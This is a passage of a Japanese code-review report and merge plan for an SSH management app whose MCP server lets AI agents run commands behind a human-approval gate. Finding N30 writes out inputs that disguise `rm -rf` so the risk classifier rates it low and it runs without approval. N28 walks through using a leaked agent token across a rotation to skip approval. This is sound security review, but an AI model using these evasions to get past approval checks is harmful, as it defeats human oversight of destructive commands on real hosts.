**内容**: TOFU の記録が HostKeyCallback の中、つまり認証前の鍵交換中に走る。認証に失敗した GUI の接続テストや、GUI から開いたターミナルは、指紋を一度も見せずに提示された鍵を黙って記録する。MCP はその鍵を無条件に信頼する。

**シナリオ**: スクラッチのテストで、誤ったパスワードの「接続テスト」は `unable to authenticate` で失敗したが、known_hosts には既に `[127.0.0.1]:port ssh-ed25519 ...` が追記されていた。次の MCP の runSSHCommand は、人が指紋を一度も見ないまま成功した。app.go:552 が指紋を見せるのは成功時だけで、terminal.go は何も見せない。初回接触時にいるなりすましサーバーは、認証に失敗するだけで（あるいはユーザーがターミナルを開くだけで）、設計が求める指紋確認（記録時に表示）を経ずに TOFU の身元として信頼される。

**修正案**: コールバックでは鍵を候補として保持するだけにし、認証が成功してユーザーに指紋を見せた（またはユーザーが確認した）後にだけ known_hosts に書く。

#### N21 [minor/P3/p3-storage] storage.go:218

**内容**: v3 の移行は command_requests.target_fp を DEFAULT '' で追加し、既存の行を埋めない。v2 で pending だった要求は TargetFP が空で、approve()（approval.go:312）と GetApprovalTarget（approval.go:254）は req.TargetFP != "" のときだけ実行先の変更を確かめる。さらに起動時のループ（app.go:396-410）がこれらの pending 行に新たに pendingRequestTTL を丸ごと与える。そのため 0949e69 のガード（要求後に user@host:port が変わったら承認を拒否）が v2 から持ち越した要求に効かない。

**シナリオ**: 1) v2 のビルドで、エージェントが接続 "prod"（user@10.0.0.5:22）に `systemctl restart app` を積み、要求が pending のままアプリを閉じる。2) v3 を入れる。migrate() が target_fp='' を追加し、migrateToV3 は空のまま。起動時にその行は expires_at = 現在 + pendingRequestTTL になる。3) "prod" を 10.0.0.9 に向ける（またはユーザーを変える）。4) GetApprovalTarget は FPChanged=false で警告を出さず、approve() は target_changed の確認を飛ばし、コマンドは 10.0.0.9 で実行される。アップグレード後に作られた要求なら、同じ編集で target_changed として拒否される。

**修正案**: migrateToV3 で、pending 行の target_fp を connection_id で引いた接続（移行時点の user@host:port）から埋める。または target_fp のない pending 行を期限切れにするか印を付ける。あるいは approve() が SSH 要求の空の TargetFP を「実行先不明」とみなし、要求し直しを求める。

#### N22 [minor/P2/p2-terminal] terminal.go:679（前回 #38 のリサイズ部分）

**内容**: ResizeTerminal は termMu の下で ts.cols/rows を更新するが、session.WindowChange はロックを放してから呼ぶ。Wails v2 はバインディングの呼び出しを 1件ずつ別のゴルーチンで処理し（darwin frontend.go:427 `go func(){ dispatcher.ProcessMessage }`、windows `go f.dispatchMessage`）、フロントは前の ResizeTerminal を待たずに次を送る（terminal-tabs.js:227、ウィンドウのドラッグ中は 1 フレームに最大 1回）。連続した 2つのリサイズがリモートの PTY に逆順で届きうる。コミット後の `session.WindowChange(nowRows, nowCols)`（terminal.go:471-472）と、commitTerminal 直後に来た ResizeTerminal の間にも同じ順序のなさがある。

**シナリオ**: ウィンドウの端をドラッグすると、scheduleFit が 100x30（A）の syncSize を、1 フレーム後に 120x40（B）を出し、それぞれ別の Wails ゴルーチンになる。B が先に termMu を取って ts.cols=120 にし WindowChange(40,120) を送り、続いて A が ts.cols=100 にし WindowChange(30,100) を送る。リモートの PTY は 100x30 で終わるが xterm は 120x40 を表示し、ts.cols/rows も古いサイズを持つ。フロントの lastSize は既に B なので、サイズが再び変わるまで syncSize は何も送らない。その間 vim・less・top・行の折り返しが誤った幅で描かれる。

**修正案**: 順番どおりにサイズを適用する。ts.cols/rows を設定するのと同じ臨界区間で取るセッション単位の resize mutex を持ったまま WindowChange を呼ぶか、通知のたびに最新の ts.cols/rows だけを適用するゴルーチンをセッションごとに 1つ置く。コミット後の WindowChange も同じ経路を通す。

#### N23 [minor/P2/p2-app] app.go:901（グループ δ）

**内容**: DeleteConnection はタブを閉じるだけで、その接続の実行中のコマンド（承認済み・MCP の自動実行）を cancel しない。行が a.conns から消えるので、実行はサイドバーの件数からも消え、DisconnectConnection でも止められなくなる。

**シナリオ**: web-01 で承認済みの長いコマンド（既定のタイムアウト、MCP なら最大 3600秒）が実行中に、接続先管理画面で web-01 を削除する。closeTerminalsForConnection はタブを閉じるが cancelExecsForConnection は呼ばれず、runSSHCommand は動き続ける。sessionSummaries は a.conns だけを回すので、その conn.ID の running はどの行にも出ない。summarizeSessions の running 合計（model.js:169）も行の合計なので 0（runningTotal はフロントで使われていない）。DisconnectConnection(id) は connectionByID に失敗して not_found を返す。ユーザーは削除済みのホストで動き続けるコマンドを、アプリの終了以外で止められず、件数表示でも見えない。

**修正案**: DeleteConnection で closeTerminalsForConnection と一緒に cancelExecsForConnection(conn.ID, errDisconnected) を呼ぶ（削除の確認文に実行中の件数を足す）。あるいは削除済みの connID に running が残っている間はサマリーに残す。

#### N24 [minor/P2/p2-app] app.go:397（前回 #19 の副作用）

**内容**: shutdown は実行中のコマンドを待たずに、すぐ全件を cancel(errShuttingDown) して SIGKILL する。design-v1 §5.0 の2 は「最大 N 秒待ち、終わらなければ cancel して中断を永続化」で、順序が逆。

**シナリオ**: 承認済みの `apt-get upgrade -y`（残り約2秒）が実行中にユーザーがウィンドウを閉じる。OnBeforeClose の確認はフェーズ2では未実装（範囲外）なので、そのまま shutdown に進む。shutdown が appCancel と cancelExecs を即座に実行し、runSSHCommand は ctx.Done を受けて session.Signal(SIGKILL) と Close を行い、dpkg が途中で落ちる。要求は interrupted（結果不明）と記録される。仕様どおりなら shutdownExecGrace（5秒）の間に完了し succeeded が記録されていた。waitExecs の待機は cancel の後にあるので、待つ対象は「中断の記録」だけ。phase2-contract.md:332 も cancel→待機の順で書かれており、design-v1 と食い違う。

**修正案**: stopMCPServer で受付を止めた後、まず execWG を shutdownExecGrace まで待ち、期限を過ぎて残ったものだけを cancelExecs(errShuttingDown) してから、中断の記録を短く待つ。新規の受付拒否は appCtx とは別のフラグで先に立てる。即 cancel を採るなら design-v1 を改めてその旨を明記する。なお P3 の drainMCPCommands（mcp_status.go:146）は「待ってから cancel」の順になっている。

#### N27 [minor/P3/p3-mcp] mcp_server.go:510

**内容**: 承認省略の実行が RequestTimeout を超えて切り離されたときの応答が、仕様（§5.3「{state:"running", request_id}」）とツール説明（「state=running を返し」）の state=running ではなく state=auto_running になっている。

**シナリオ**: 承認省略を許されたエージェントが RequestTimeout（既定 30秒）より長くかかる Low のコマンドを送る。タイマーで切り離された後の findRequest の Status は stateAutoRunning で、応答は `state:"auto_running"`。文書どおり state=="running" を見て get_request_status に移るクライアントはこれを認識できず、終了状態と取り違えるかエラーとして扱う。

**修正案**: 仕様とツール説明を auto_running に直すか、切り離しの応答では state を running に揃える。どちらかに決めてテストを足す。

#### N28 [minor/P3/p3-auth] app.go:962

**内容**: agentBypassCovers は承認省略の可否をエージェント名（a.agentTokens[agentName]）だけで判定し、要求を認証したトークンのハッシュを確かめない。authenticateMCP はヘッダーを読んだ後、本文を読む前に 1回だけ走る。そのため IssueAgentToken によるローテーションの前に古いトークンで認証した要求は、ローテーション後も自動実行される。

**シナリオ**: 攻撃者が漏れたエージェント "claude" のトークン sga_OLD を持つ。claude には有効な承認省略（Medium、全接続）がある。攻撃者は `Authorization: Bearer sga_OLD` と Content-Length を付けた POST /mcp を多数開き、ヘッダーだけ送って本文を止める。各 handleMCP は authenticateMCP で mcpCaller{Agent:"claude"} を得て io.ReadAll でブロックする。漏洩に気づいたユーザーが IssueAgentToken("claude") でローテーションし、新しいハッシュが古いものを置き換え、UI は「古いトークンはもう使えません」と表示する。ReadTimeout（RequestTimeout、既定 30秒）以内に攻撃者は各本文を execute_command の tools/call（任意ホストの Medium のコマンドなど）で完成させる。needsHumanApproval → agentBypassCovers("claude", ...) は a.agentTokens["claude"]（新トークン、Bypass=true）と有効なポリシーを見つけ、runBypassedCommand が保留していた要求をすべて承認なしで実行する。提示されたトークンは失効しているのに。接続数に上限がないので、1回のローテーションで事前に開いた数だけ承認なしのコマンドが通る。ローテーションでは処理中の要求を止められない。RevokeAgentToken は名前のエントリと付与を一緒に消すので影響しない。

**修正案**: 一致した TokenHash（またはトークンの世代番号）を mcpCaller に持たせ、agentBypassCovers で a.mu の下で a.agentTokens[agentName].TokenHash == caller.TokenHash を要求する。あるいは本文を読んだ後にもう一度認証する。「古いトークンで認証→ローテーション→needsHumanApproval が true を返す」テストを足す。

#### N30 [minor/P3/p3-risk] mcp_server.go:1023（グループ γ）

**内容**: riskWords はクォートで分割するが、バックスラッシュのエスケープとバックスラッシュ+改行（行継続）を処理しない。よく使われる `\rm`（エイリアス展開なしで rm を実行）と `r\<LF>m` がどちらも Low になる。

**シナリオ**: 承認省略付きのエージェントが `\rm -rf /tmp/x` または `"r\\\nm -rf /tmp/x"`（r と m の間にバックスラッシュ+改行）を送る。riskWords は `["\\rm","-rf","/tmp/x"]` / `["r\\","m","-rf","/tmp/x"]` を返し、highWords の検索で rm が見つからないので Low、自動実行され、リモートのシェルは `rm -rf /tmp/x` を実行する。`rm${IFS}-rf${IFS}/tmp/x`（単語は "rm$" と "ifs"）も同じ。スクラッチでこの3つが Low になることを確認。doc コメントは分類器がクォートと区切りを「見る」と書いているが、エスケープの処理はしていない。

**修正案**: 分割の前に、シェルと同じようにバックスラッシュのエスケープと行継続を取り除く。あるいは `\` か `$` を含むコマンドを最低でも High にしてキューに入れる（fail-closed）。

---

## 4. マージと統合の担当がやるべき修正

### 4.1 マージで退行させないこと（片側だけ fixed の 28件 + #19）

1. **承認画面（グループ A: #22, #40, #53、critical 含む）**: P2 の approvalTarget / data-request-id / selectedRequestId の固定（frontend/src/main.js:442-447, :473, :554）を必ず残す。P3 の main.js:1061-1072, :1153, :2001-2057 の形が残ると critical が復活する。P3 で追加された承認画面の要素（target_changed の表示、GetApprovalTarget など）は P2 の構造に載せ替える。統合後に main.test.js:282 相当のテストが通ることを確認する。
2. **ターミナル（#20, #39, #38）**: P2 の a.terms・仮登録・commitTerminal の再確認・pumpTerminalInput と terminal-tabs.js の直列送信を採用する。P3 の単一 a.term モデル（terminal.go:85-160, :289-302）や main.js:1318 の await なし送信を戻さない。
3. **CI（#24, #25, #26, #27, #43, #44, #45, #54）**: `.github/` と `frontend/package-lock.json` は P2 側を採用する（SHA 固定、contents: read、persist-credentials: false、`npm ci --ignore-scripts`、`wails build -s`、govulncheck v1.9.0 の OS マトリクス、`needs: test`、npm audit、dependabot、vite 8.3.5）。P3 の依存追加があれば P2 の lockfile に足し直して `npm audit` を再実行する。
4. **承認の実行先（グループ B: #2, #11, #31）**: P3 の resolveRequestTarget と TargetFP 確認（approval.go:199-212, :305-317）を採用し、P2 の approval.go:139-153 の名前フォールバックを残さない。
5. **削除の CAS（グループ C: #13, #18、#4 の半分）**: P3 の approval.go:482-516 と storage.go:645 deleteCommandRequestUnlessRunning を採用する。
6. **client_request_id（グループ D: #15, #17, #30、#16）**: P3 の lockKey と existingClientRequest / loadRequestByClientID を採用する。
7. **Bearer と承認省略（グループ G: #32, #52）**: P3 の authenticateMCP / mcpCaller / mayBypassAs を採用する。P2 の approval.go:272-279 の判定を残さない。
8. **ホスト鍵（#8）・バックアップ（#50）・stderr_truncated（#58）**: P3 の hostkey.go、storage.go backupBeforeMigration、mcp_server.go:568 を採用する。
9. **終了処理（#19）**: 両側で実装が違うので一方に揃える。P3 の「受付停止→grace まで待つ→残りを cancel→完了待ち」の順を基本にし、P2 の trackExec / waitExecs による GUI 承認・ターミナル・MCP の追跡を合わせる（N24 も同時に解消する）。両側のテスト TestShutdownInterruptsRunning、TestShutdownInterruptsMCPExec、TestShutdownDrainsGUIApprovedRun を全部残して通す。
10. **riskWords の退行**: P3 の classifyRisk は P2 より改善しているが、`\rm` が P2 の High から Low に下がった（#5）。P3 側を採用したうえで §4.2 の 1 を必ず入れる。

### 4.2 マージ後に直すもの（優先順）

1. **リスク分類を fail-closed にする（critical N15, N16、major N17, N29、minor N30、前回 #5, #28, #48, #49, #6, #29）**: POSIX のクォート除去と `\` の処理をしてから単語を作る。`$` `` ` `` `\` `{` `,` `[` `?`、eval/source/alias、sh -c / bash -c / パイプからのシェル、python/perl/ruby/node -c/-e、base64 -d|… を含むものは High（キュー強制）。コマンド名ごとに引数を順不同で調べる（dd の of=、systemctl の stop/restart/kill/mask/disable/isolate、chmod/chown の -R/--recursive、iptables*/ip6tables*/nft* の接頭辞）。リダイレクト・tee・cp・chmod・chown は書き込みとして扱う。containsWord を basename とクォート除去の後の単語で判定する。承認省略で自動実行できるのは許可リストのコマンドだけにすることを検討する。
2. **不変条件のテスト（前回 #46, #55, #56, #57）**: RequireApprovalWriteOp=false で High が pending に残る E2E テスト、WriteOp=false・Sudo=true で sudo 規則だけを確かめるテスト、risk_increased（空でない第2引数での Approve*）と force_queue のテスト、N15/N16/N17/N29/N30 の入力のテストを入れる。
3. **承認画面の表示と実行の一致（major N26、N5, N25, N8）**: bidi/不可視文字を拒否または可視化する。renderAfterAction・setLang を pageIsBusy() で守るか、承認・設定フォームの値を state に保持する。dirty.approval は result.ok の後にだけ下げる。
4. **切断・削除・終了で実行が止まること（major N2、minor N3, N4, N23, N24、前回 #7, #33）**: running/auto_running への遷移と実行の追跡登録を不可分にする。openSSHClient の後と session.Run の直前で ctx を確かめる。切断ボタンを Running > 0 でも有効にする。DeleteConnection で cancelExecsForConnection を呼ぶ。NewSession と ssh-agent 接続にデッドラインと ctx による close を掛ける。
5. **ターミナル入力の安全性（major N1, N6、minor N22）**: シリアルの stdinWriter を close と同じ mutex で直列化し、close 後は ErrClosedPipe。input_timeout 後は送信を止めるか順番どおり再送する。ResizeTerminal を順番どおり適用する。
6. **ホスト鍵（major N18/N31, N19、minor N20、N21）**: 未知ホストでは証明書アルゴリズムを外して交渉するか cert.Key で TOFU する。ResetHostKey / GetHostKeyInfo の UI（指紋表示と確認付きリセット）を接続先編集画面に足す。TOFU 記録は認証成功と指紋表示の後にする。v3 移行で pending 行の target_fp を埋めるか、空の TargetFP を実行先不明として扱う。
7. **MCP の認証・情報の範囲（N11, N12, N13, N14, N27, N28）**: timeout_seconds を保存してキュー経路でも使う。get_request_status を requested_by で絞り、request_id に乱数を入れる。/audit の User を伏せる。重複排除キーに認証を含める。切り離し時の state を仕様と揃える。承認省略の判定で TokenHash を照合する。
8. **その他の前回からの残り**: #1（MCP パスの検証と recover）、#3（単一インスタンスのロック）、#10・#34（旧 JSON 取り込みの失敗と空 DB）、#12（バックアップを 0600 で事前作成）、#14（maskToken）、#21（MCP 設定のライフサイクルを a.mu と一体で直列化）、#23（/tmp へのフォールバックと所有者確認）、#35・N7（認証方式切替で credential を常に消す）、#36（host/port/user が変わったら保存済み Credential を使わない）、#37（最終状態の保存失敗をエラーとして返す）、#41（Windows ACL）、#42（パイプ名の正規化）、#47（旧「承認待ち」の移行）、#51（JSON-RPC レスポンスに 202）、#4 の後半（実行済み記録の物理削除をやめる）、#9（鍵パスの展開）、N9・N10（ターミナルのタブ列のフォーカスと ARIA）。
